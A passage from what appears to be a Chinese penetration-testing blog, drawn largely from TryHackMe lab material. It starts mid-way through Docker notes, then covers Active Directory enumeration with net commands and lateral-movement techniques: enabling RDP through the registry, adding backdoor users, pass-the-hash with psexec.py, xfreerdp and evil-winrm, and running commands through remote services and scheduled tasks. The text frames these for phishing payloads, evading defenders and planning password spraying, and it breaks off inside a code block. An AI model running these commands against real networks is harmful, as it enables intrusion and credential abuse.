保存的是镜像（image），docker export 保存的是容器（container）；</span><br><span class="line">- docker load 用来载入镜像包，docker import 用来载入容器包，但两者都会恢复为镜像；</span><br><span class="line">- docker load 不能对载入的镜像重命名，而 docker import 可以为镜像指定新名称。</span><br><span class="line"> </span><br><span class="line">若导入时出现这个问题 open /var/lib/docker/tmp/docker-import-970689518/bin/json: no such file or directory，说明这个 tar 包缺少 docker 所需要的一些 json 文件，不能直接导入。</span><br><span class="line"></span><br><span class="line">Docker network ls 查看网络</span><br><span class="line"></span><br><span class="line">Docker network rm  删除网络</span><br></pre></td></tr></table></figure><h4 id="docker-网络模式"><a href="#docker-网络模式" class="headerlink" title="docker 网络模式"></a>docker 网络模式</h4><p>Docker 提供了几种不同的网络模式，每种模式有不同的用途和适用场景。以下是 Docker 支持的主要网络模式：</p><ol><li><p><strong>bridge</strong>（桥接模式）：</p><ul><li>默认的网络模式。</li><li>每个容器会连接到一个虚拟的网络桥接设备（<code>docker0</code>），并分配一个私有 IP 地址。</li><li>容器之间可以通过私有 IP 地址相互通信，但对外部网络是隔离的，通常通过端口映射暴露服务。</li></ul></li><li><p><strong>host</strong>（主机模式）：</p><ul><li>容器直接使用宿主机的网络堆栈。</li><li>容器没有自己的虚拟网络接口，而是共享宿主机的网络接口。这意味着容器与宿主机之间没有隔离，它将使用宿主机的 IP 地址和端口。</li><li>适合高性能、低延迟需求的场景，但没有网络隔离。</li></ul></li><li><p><strong>none</strong>（无网络模式）：</p><ul><li>容器不会连接到任何网络。</li><li>容器无法访问网络，除非手动配置网络接口。通常用于特殊用途，例如完全隔离的容器或不需要网络的应用。</li></ul></li><li><p><strong>container:<name_or_id></strong>（容器模式）：</p><ul><li>让一个容器共享另一个容器的网络堆栈。</li><li>共享容器的网络配置，包括 IP 地址、端口等。容器间通信就像是在同一网络中一样，不需要额外的网络配置。</li><li>适合那些需要直接与另一个容器进行通信的场景。</li></ul></li><li><p><strong>overlay</strong>（覆盖网络模式）：</p><ul><li>用于多主机 Docker 集群，通常配合 Docker Swarm 或 Kubernetes 等工具使用。</li><li>容器可以跨多个 Docker 主机通信，Docker 会自动在主机之间创建一个虚拟的网络覆盖层，容器之间能够像在同一网络中一样通信。</li><li>需要 Docker 的集群管理工具（如 Swarm 或 Kubernetes）支持。</li></ul></li><li><p><strong>macvlan</strong>（MACVLAN 模式）：</p><ul><li>为容器分配一个独立的 MAC 地址，并将其视为物理网络上的独立设备。</li><li>适用于需要容器直接与宿主机网络进行通信的场景。容器通过 MAC 地址与其他设备进行通信，容器之间的隔离性较低。</li><li>可以用于需要与外部网络直接交互，或需要将容器暴露到宿主网络中的情况。</li></ul></li><li><p><strong>ipvlan</strong>（IPvlan 模式）：</p><ul><li>是一种基于 IP 地址的网络模式，与 macvlan 相似，但提供更细粒度的 IP 管理。</li><li>比 macvlan 更加灵活且高效，适合需要通过多个子网进行容器通信的场景。</li><li>容器和宿主机共享网络堆栈，但容器通过虚拟的网络接口进行通信。</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域常见信息枚举</title>
      <link href="/2025/01/30/%E5%9F%9F%E5%B8%B8%E8%A7%81%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE/"/>
      <url>/2025/01/30/%E5%9F%9F%E5%B8%B8%E8%A7%81%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE/</url>
      
        <content type="html"><![CDATA[<p>当您可能无法访问系统的 RDP、防御者正在监控 PowerShell 的使用以及您需要通过远程访问木马 （RAT） 执行 AD 枚举时，可靠可靠的 CMD 非常方便。在网络钓鱼有效负载中嵌入几个简单的 AD 枚举命令甚至会有所帮助，以帮助您获取可以帮助您进行最终攻击的重要信息。</p><p>CMD 有一个内置命令，我们可以使用它来枚举有关 AD 的信息，即 <code>net</code>。<code>net</code> 命令是一个方便的工具，用于枚举有关本地系统和 AD 的信息。我们将看看我们可以从这个位置列举出一些有趣的事情，但这不是一个详尽的列表CMD 有一个内置命令，我们可以使用它来枚举有关 AD 的信息，即 <code>net</code>。<code>net</code> 命令是一个方便的工具，用于枚举有关本地系统和 AD 的信息。我们将看看我们可以从这个位置列举出一些有趣的事情，但这不是一个详尽的列表。</p><h4 id="1-常见枚举命令"><a href="#1-常见枚举命令" class="headerlink" title="1. 常见枚举命令"></a>1. 常见枚举命令</h4><p><strong>Users 用户</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">net user /domain</span><br><span class="line"></span><br><span class="line">- 普通用户账号</span><br><span class="line">- 系统账户（例如某些服务账户）</span><br><span class="line">- 特殊账户（如计算机账户）</span><br><span class="line">- </span><br></pre></td></tr></table></figure><p><strong><code>net user /domain</code></strong> 命令用于查询域内的用户账户。只有当计算机<strong>加入域</strong>并且能够与域控制器通信时，才会有效。<br><strong><code>net user</code></strong> 命令不带 <code>/domain</code> 参数时，它会列出<strong>本地计算机</strong>上的用户账户。</p><ul><li><strong>域用户不一定是 <code>Domain Users</code> 组的成员</strong>：虽然大部分通过 <code>net user /domain</code> 列出的用户都会是 <strong><code>Domain Users</code></strong> 组的成员，但 <strong><code>Domain Users</code> 组中并不包括所有的用户</strong>，有时某些用户可能会被加入到 <strong>特定的组</strong>，而不是默认的 <code>Domain Users</code> 组中。这样，它们可能出现在 <strong><code>net user /domain</code></strong> 的列表中，但不在 <strong><code>Domain Users</code></strong> 组中。</li><li>不会列出后缀是$的用户</li></ul><p>这将为我们返回所有 AD 用户，并有助于确定域的大小以进行进一步的攻击。我们还可以使用此子选项来枚举有关单个用户帐户的更多详细信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user zoe.marshall /domain</span><br></pre></td></tr></table></figure><p>**注意：如果用户只是少数 AD 组的一部分，则此命令将能够向我们显示组成员身份。但是，通常，在超过十个组成员身份之后，该命令将无法列出所有成员身份。</p><p><strong>Groups 组</strong></p><p>我们可以使用 <code>net</code> 命令通过使用 <code>group</code> 子选项来枚举域的组：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net group /domain</span><br><span class="line">net localgroup 是列出本地组 </span><br></pre></td></tr></table></figure><p>这些信息可以帮助我们找到目标执行的特定目标群体。我们还可以通过在同一命令中指定组来枚举更多详细信息，例如组的成员身份：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Tier 1 Admins&quot; /domain</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查询域管理员</span></span><br><span class="line">net group &quot;Domain Admins&quot; /domain</span><br></pre></td></tr></table></figure><p><strong>Password Policy 密码策略</strong><br>可以使用 <code>net</code> 命令通过使用 <code>accounts</code> 子选项来枚举域的密码策略：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net accounts /domain</span><br></pre></td></tr></table></figure><ul><li>  保留的密码历史记录的长度。这意味着用户必须提供多少个唯一密码才能重复使用旧密码。</li><li>  错误密码尝试的锁定阈值以及帐户将被锁定的时间长度。</li><li>  密码的最小长度。</li><li>  允许密码达到的最长期限，指示是否必须定期轮换密码。</li></ul><p>如果我们想对我们现在列举的其他用户帐户进行额外的密码喷洒攻击，这些信息可以使我们受益。它可以帮助我们更好地猜测在攻击中应该使用哪些单一密码，以及在冒着锁定帐户的风险之前我们可以运行多少次攻击。但是，应该注意的是，如果我们执行盲密码喷射攻击，我们无论如何都可能会锁定帐户，因为我们没有检查以确定该特定帐户在被锁定之前还剩下多少次尝试。</p><p><a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/net-commands-on-operating-systems">net相关命令</a></p><h4 id="2-Benefits-好处"><a href="#2-Benefits-好处" class="headerlink" title="2. Benefits 好处"></a>2. Benefits 好处</h4><ul><li>  不需要额外的工具或外部工具，这些简单的命令通常不会受到 Blue 团队的监控。</li><li>  我们不需要 GUI 来执行此枚举。</li><li>.<br>  VBScript 和其他通常用于网络钓鱼有效负载的巨集语言本身支持这些命令，因此在制作更具体的有效负载之前，它们可用于枚举有关 AD 域的初始信息。</li></ul><p>Drawbacks 缺点</p><p>-<br><code>net</code> 命令必须从已加入域的计算机上执行。如果计算机未加入域，它将默认为 WORKGROUP 域。</p><p>-<br>    <code>net</code> 命令可能无法显示所有信息。例如，如果用户是 10 个以上组的成员，则并非所有这些组都会显示在输出中。</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网横向的一些方式</title>
      <link href="/2025/01/29/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%9A%84%E4%B8%80%E4%BA%9B%E6%96%B9%E5%BC%8F/"/>
      <url>/2025/01/29/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%9A%84%E4%B8%80%E4%BA%9B%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h4 id="1-RDP"><a href="#1-RDP" class="headerlink" title="1. RDP"></a>1. RDP</h4><h5 id="1-1-开启rdp"><a href="#1-1-开启rdp" class="headerlink" title="1.1 开启rdp"></a>1.1 开启rdp</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更改端口</span></span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp&quot; /v PortNumber /t REG_DWORD /d 3389 /f</span><br><span class="line"></span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 3389 /f</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置通过防火墙端口</span></span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall set rule group=&quot;remote desktop&quot; new enable=yes</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启计算机</span></span><br><span class="line"></span><br><span class="line">shutdown /r /f /t 0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可以重启服务避免重启计算机</span></span><br><span class="line"></span><br><span class="line">net stop termservice</span><br><span class="line">net start termservice</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">powershell</span></span><br><span class="line"></span><br><span class="line">Restart-Service -Name &quot;TermService&quot;</span><br></pre></td></tr></table></figure><h5 id="1-2-自建用户"><a href="#1-2-自建用户" class="headerlink" title="1.2 自建用户"></a>1.2 自建用户</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> net user hack hack /add</span><br><span class="line"></span><br><span class="line">发现添加不成功，后来发现是因为有密码设置策略，密码不能太简单且不能包含用户名</span><br><span class="line"></span><br><span class="line"> net user hack qaz@123</span><br></pre></td></tr></table></figure><ul><li>3389 开启就可以了<br>明文和hash都可以直接使用来达到连接的作用。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH  </span><br></pre></td></tr></table></figure><h4 id="2-Psexec-执行程序"><a href="#2-Psexec-执行程序" class="headerlink" title="2. Psexec 执行程序"></a>2. Psexec 执行程序</h4><ul><li><strong>Ports:</strong> 445&#x2F;TCP (SMB)<br>  <strong>端口：</strong> 445&#x2F; TCP （ SMB ）</li><li><strong>Required Group Memberships:</strong> Administrators<br>  **所需的组成员身份：管理员</li></ul><p>多年来，Psexec 一直是需要远程执行进程时的首选方法。它允许管理员用户在他有权访问的任何 PC 上远程运行命令。 Psexec 是众多 Sysinternals 工具之一，可以<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">在此处</a>下载。</p><h5 id="2-1-工作方式："><a href="#2-1-工作方式：" class="headerlink" title="2.1 工作方式："></a>2.1 工作方式：</h5><p>1.<br>    连接到 Admin$ 共享并上传服务二进制文件。 Psexec 使用 psexesvc.exe 作为名称。<br>2.<br>    连接到服务控制管理器以创建并运行名为 PSEXESVC 的服务，并将服务二进制文件与<code>C:\Windows\psexesvc.exe</code>关联。<br>3.<br>    创建一些命名管道来处理 stdin&#x2F;stdout&#x2F;stderr。</p><p>其实工作方式很明确了,就是通过一些通道或者一些东西来传输对应的命令。但是我们需要对面的管理员权限因此我们刚才的总基调就可以看到，我们只能使用域管理员和一些默认管理员<br>进行一些管道的传输。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a488102fe0da47a3667961400cf298d8.png"></p><p>要运行 psexec，我们只需提供远程主机所需的管理员凭据以及我们要运行的命令（为方便起见， <code>psexec64.exe</code>可在 THMJMP2 的<code>C:\tools</code>下找到）：<br>只能对应的是管理员</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="2-2-linux通过hash进行连接"><a href="#2-2-linux通过hash进行连接" class="headerlink" title="2.2  linux通过hash进行连接"></a>2.2  linux通过hash进行连接</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP</span><br><span class="line"></span><br><span class="line">psexec.py administrator@172.22.15.24 -hashes &#x27;0e52d03e9b939997401466a0ec5a9cbc&#x27; -codec gbk</span><br></pre></td></tr></table></figure><p>但是针对于psexec来讲，我们使用的pth 只能是linux版本的psexec 进行PTH利用hash凭据而并非明文就可以进行登陆。</p><h5 id="2-3-cs中的-psexec"><a href="#2-3-cs中的-psexec" class="headerlink" title="2.3 cs中的 psexec"></a>2.3 cs中的 psexec</h5><h4 id="3-WinRM-远程创建进程"><a href="#3-WinRM-远程创建进程" class="headerlink" title="3.  WinRM 远程创建进程"></a>3.  WinRM 远程创建进程</h4><h5 id="3-1-winrm-介绍"><a href="#3-1-winrm-介绍" class="headerlink" title="3. 1 winrm 介绍"></a>3. 1 winrm 介绍</h5><p>WinRM 使用 <strong>SOAP</strong> 协议来封装和传输命令和请求。WinRM 通过 <strong>WS-Management</strong>（Web Services Management）标准来进行通信，这个标准使用了 <strong>SOAP</strong> 来传递消息。</p><ul><li><strong>SOAP</strong>：是一种基于 XML 的协议，用于在计算机网络上交换结构化信息，尤其适用于 Web 服务通信。</li><li><strong>WS-Management</strong>：是一个 Web 服务标准，用于通过网络远程管理系统。它基于 SOAP 和 HTTP(S) 协议实现，WinRM 就是实现了这一标准</li></ul><ol><li><strong>请求和响应</strong>：当你使用 WinRM 进行远程管理时，WinRM 客户端和服务器之间会通过 SOAP 消息来传递请求和响应。</li><li><strong>SOAP 消息</strong>：这些 SOAP 消息会通过 HTTP 或 HTTPS 协议传输，通常使用端口 5985 或 5986（HTTP 和 HTTPS）</li></ol><ul><li><strong>Ports:</strong> 5985&#x2F;TCP (WinRM HTTP) or 5986&#x2F;TCP (WinRM HTTPS)<br>  <strong>端口：</strong> 5985&#x2F;TCP (WinRM HTTP ) 或 5986&#x2F; TCP (WinRM HTTPS)</li><li><strong>Required Group Memberships:</strong> Remote Management Users<br>  **所需的组成员身份：远程管理用户</li></ul><ul><li>管理员组也可以</li></ul><p>远程管理员”这个术语强调的是管理操作的方式，而不仅仅是权限。即便某个用户是本地管理员，称为“远程管理员”是为了区分他们是通过远程工具（如远程桌面或 PsExec）来执行管理任务的。这种表述帮助明确管理员的管理操作是通过远程手段完成的，而不是在本地直接操作</p><p>Windows 远程管理 (WinRM) 是一种基于 Web 的协议，用于远程向 Windows 主机发送 Powershell 命令。大多数 Windows Server 安装都会默认启用 WinRM，这使其成为一个有吸引力的攻击媒介。</p><p>要从命令行连接到远程 Powershell 会话，我们可以使用以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs.exe -u:Administrator -p:Mypass123 -r:target cmd</span><br></pre></td></tr></table></figure><p>我们可以从 Powershell 实现相同的目的，但要传递不同的凭据，我们需要创建一个 PSCredential 对象：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;Administrator&#x27;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;Mypass123&#x27;</span>;</span><br><span class="line"><span class="variable">$securePassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="variable">$password</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>; </span><br><span class="line"><span class="variable">$credential</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential <span class="variable">$username</span>, <span class="variable">$securePassword</span>;</span><br></pre></td></tr></table></figure><p>获得 PSCredential 对象后，我们可以使用 Enter-PSSession cmdlet 创建交互式会话：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Enter-PSSession</span> <span class="literal">-Computername</span> TARGET <span class="literal">-Credential</span> <span class="variable">$credential</span></span><br></pre></td></tr></table></figure><p>Powershell 还包括 Invoke-Command cmdlet，它通过 WinRM 远程运行 ScriptBlocks。凭证也必须通过 PSCredential 对象传递：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-Computername</span> TARGET <span class="literal">-Credential</span> <span class="variable">$credential</span> <span class="literal">-ScriptBlock</span> &#123;whoami&#125;</span><br></pre></td></tr></table></figure><h5 id="3-2-evil-winrm"><a href="#3-2-evil-winrm" class="headerlink" title="3.2   evil-winrm"></a>3.2   evil-winrm</h5><p>这是一个综合的工具，不仅仅是拿到shell<br><a href="https://www.cnblogs.com/backlion/p/17202253.html">https://www.cnblogs.com/backlion/p/17202253.html</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">hash</span></span></span><br><span class="line"></span><br><span class="line">evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">明文</span></span><br><span class="line"></span><br><span class="line">evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987</span><br></pre></td></tr></table></figure><h4 id="4-使用-sc远程创建服务"><a href="#4-使用-sc远程创建服务" class="headerlink" title="4. 使用 sc远程创建服务"></a>4. 使用 sc远程创建服务</h4><ul><li><strong>Ports: 端口：</strong><ul><li>135&#x2F;TCP, 49152-65535&#x2F;TCP (DCE&#x2F;RPC)<br>  135&#x2F; TCP ，49152-65535&#x2F; TCP （DCE&#x2F;RPC）</li></ul></li></ul><p>只需要 rpc 和动态端口 ，445端口可以作为一个文件上传的利用点使用。</p><ul><li><p>445&#x2F;TCP (RPC over SMB Named Pipes)<br> 445&#x2F; TCP （基于SMB命名管道的 RPC）</p></li><li><p>139&#x2F;TCP (RPC over SMB Named Pipes)<br>  139&#x2F; TCP （基于SMB命名管道的 RPC）</p></li><li><p><strong>Required Group Memberships:</strong> Administrators<br>  **所需的组成员身份：**管理员</p></li></ul><p>Windows 服务也可用于运行任意命令，因为它们在启动时执行命令。虽然服务可执行文件在技术上与常规应用程序不同，但如果我们配置 Windows 服务来运行任何应用程序，它仍然会执行该应用程序并随后失败。启动服务居然可以任意执行相关命令 ，因此可以看到对应也可以执行对应的命令。</p><ul><li>当你运行 <code>sc.exe \\TARGET create THMservice ...</code> 时，操作系统会检查当前用户（你在本机的凭证）是否有权限在远程机器 <code>TARGET</code> 上执行该操作。</li><li>如果当前用户在远程计算机上没有足够的权限（例如管理员权限），操作会失败，通常会返回类似“拒绝访问”或“权限不足”的错误。</li></ul><p>SMB 协议和 445 端口的开放对于使用 <code>sc.exe</code> 来进行远程服务操作是非常重要的，但 <strong>RPC 协议</strong>（尤其是 135 端口和动态端口）也可能起到作用。因此，除了 445 端口外，RPC 相关端口也需要开放才能确保远程管理操作成功。</p><h5 id="4-1-创建-Windows-服务时的注意事项："><a href="#4-1-创建-Windows-服务时的注意事项：" class="headerlink" title="4.1 创建 Windows 服务时的注意事项："></a>4.1 创建 Windows 服务时的注意事项：</h5><ol><li><p><strong>权限</strong>：</p><ul><li>Windows 服务通常在系统级别运行，因此需要相应的权限。确保你有足够的权限来创建和管理服务。</li><li>服务的账户可以是系统账户（如 LocalSystem、NetworkService）或特定用户账户。使用系统账户时，服务具有更高的权限，但也需要谨慎，以避免潜在的安全风险。</li></ul></li><li><p><strong>服务主程序</strong>：</p><ul><li>服务的主程序通常是一个可执行文件（<code>.exe</code>）。这个可执行文件必须符合 Windows 服务的要求，即能够响应启动、停止、暂停等控制命令。</li><li>常用的服务主程序框架包括 <code>.NET</code> 提供的 <code>ServiceBase</code> 类和 Windows API 提供的服务控制函数。</li></ul></li><li><p><strong>执行命令</strong>：</p><ul><li>在服务启动时，你可以通过服务的主程序执行命令。通常，这些命令包括启动必要的进程、初始化资源等。</li><li>在服务中执行命令时，需要处理好可能的错误和异常，以确保服务的稳定性。例如，启动时可能需要加载配置文件、建立网络连接等。</li></ul></li><li><p><strong>配置和管理</strong>：</p><ul><li>服务的配置通常存储在注册表中，或者通过配置文件来管理。你可以使用 <code>sc</code> 命令、<code>PowerShell</code> 脚本或服务控制面板来安装、启动、停止和删除服务。</li><li>在服务中执行命令时，确保命令的路径、环境变量等配置正确，以避免服务启动失败。</li></ul></li><li><p><strong>日志和监控</strong>：</p><ul><li>服务通常需要有适当的日志记录机制，以便监控其运行状态和排查故障。确保服务能够记录必要的日志信息，例如启动成功、错误信息等。</li></ul></li></ol><p>我们可以使用 sc.exe（Windows 中提供的标准工具）在远程主机上创建服务。使用sc时，它会通过几种方式尝试通过RPC连接到服务控制管理器（SVCCTL）远程服务程序：</p><ol><li> 将使用 DCE&#x2F;RPC 进行连接尝试。客户端将首先在端口 135 连接到端点映射器 (EPM)，该端点映射器充当可用 RPC 端点的目录并请求有关 SVCCTL 服务程序的信息。然后，EPM 将响应 IP 和端口以连接到 SVCCTL，该端口通常是 49152-65535 范围内的动态端口。 其实这是rpc 协议的连接过程，先通过对应的EPM  端点映射</li></ol><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c4f288e73da9c0f4d480ad817b365fe5.png"></p><ol><li>如果后一个连接失败，sc 将尝试通过端口 445 ( SMB ) 或 139 ( SMB over NetBIOS ) 上的SMB命名管道到达 SVCCTL。</li></ol><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0c425c37d692c771c944e38dca8c5879.png" alt="svcctl via named pipe"><br>所以我感觉应该是两个协议 ，一个是对应的rpc一个是smb 但是对应的服务可以执行相关命令。<br>我们可以使用以下命令创建并启动名为“THMservice”的服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示身份验证</span> </span><br><span class="line">psexec \\TARGET -u UserName -p Password sc create THMservice binPath= &quot;net user munra Pass123 /add&quot; start= auto</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sc.exe \\TARGET create THMservice binPath= &quot;net user munra Pass123 /add&quot; start= auto</span><br><span class="line">sc.exe \\TARGET start THMservice</span><br></pre></td></tr></table></figure><p>服务启动时将执行“net user”命令，在系统上创建一个新的本地用户。由于操作系统负责启动服务，因此您将无法查看命令输出。</p><p>要停止并删除该服务，我们可以执行以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc.exe \\TARGET stop THMservice</span><br><span class="line">sc.exe \\TARGET delete THMservice</span><br></pre></td></tr></table></figure><h4 id="5-远程创建计划任务"><a href="#5-远程创建计划任务" class="headerlink" title="5. 远程创建计划任务"></a>5. 远程创建计划任务</h4><ul><li><strong>Ports: 端口：</strong><ul><li>135&#x2F;TCP, 49152-65535&#x2F;TCP (DCE&#x2F;RPC)<br>  135&#x2F; TCP ，49152-65535&#x2F; TCP （DCE&#x2F;RPC）</li></ul></li></ul><p>只需要 rpc 和动态端口 ，445端口可以作为一个文件上传的利用点使用。</p><ul><li>445&#x2F;TCP (RPC over SMB Named Pipes)<br> 445&#x2F; TCP （基于SMB命名管道的 RPC）</li><li>139&#x2F;TCP (RPC over SMB Named Pipes)<br>  139&#x2F; TCP （基于SMB命名管道的 RPC）</li></ul><p>我们可以使用的另一个 Windows 功能是计划任务。您可以使用 schtasks 远程创建并运行一个任务，该任务可在任何 Windows 安装中使用。要创建名为 THMtask1 的任务，我们可以使用以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">schtasks /s TARGET /RU &quot;SYSTEM&quot; /create /tn &quot;THMtask1&quot; /tr &quot;&lt;command/payload to execute&gt;&quot; /sc ONCE /sd 01/01/1970 /st 00:00 </span><br><span class="line"></span><br><span class="line">schtasks /s TARGET /run /TN &quot;THMtask1&quot; </span><br></pre></td></tr></table></figure><p>我们将计划类型 (&#x2F;sc) 设置为 ONCE，这意味着该任务仅在指定的时间和日期运行一次。由于我们将手动运行任务，因此开始日期 (&#x2F;sd) 和开始时间 (&#x2F;st) 无论如何都不重要。</p><p>由于系统将运行计划任务，因此我们将无法获得该命令的输出，这使得这是一种盲目攻击。</p><p>最后，要删除计划任务，我们可以使用以下命令并自行清理：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /S TARGET /TN <span class="string">&quot;THMtask1&quot;</span> /DELETE /F</span><br></pre></td></tr></table></figure><h4 id="6-netexec"><a href="#6-netexec" class="headerlink" title="6 netexec"></a>6 netexec</h4><table><thead><tr><th>特性</th><th><strong>PSExec</strong></th><th><strong>netexec</strong></th></tr></thead><tbody><tr><td><strong>底层协议</strong></td><td>使用 <strong>SMB</strong> 协议（默认）</td><td>可能使用其他协议，如 <strong>NetBIOS</strong> 或自定义协议</td></tr><tr><td><strong>功能</strong></td><td>远程执行命令，支持交互式会话、程序启动等</td><td>远程执行命令，功能较简洁，灵活性较高</td></tr><tr><td><strong>安全性和认证</strong></td><td>支持多种身份验证方式，如 NTLM、Kerberos</td><td>安全性和认证方式不一致，取决于工具实现</td></tr><tr><td><strong>使用场景</strong></td><td>渗透测试、远程管理、自动化任务</td><td>可能更多用于自定义工具集，或一些特殊环境</td></tr><tr><td><strong>工具广泛性</strong></td><td>非常常见，广泛应用</td><td>较少见，特定环境下使用</td></tr><tr><td><strong>平台兼容性</strong></td><td>支持多种 Windows 版本</td><td>兼容性较低，通常是自定义工具</td></tr></tbody></table><p>一般来讲我感觉也是一种方式和方法，一般来讲这种底层协议smb 和netbios  都是底层协议不同</p><p><strong>在kali上安装了</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span 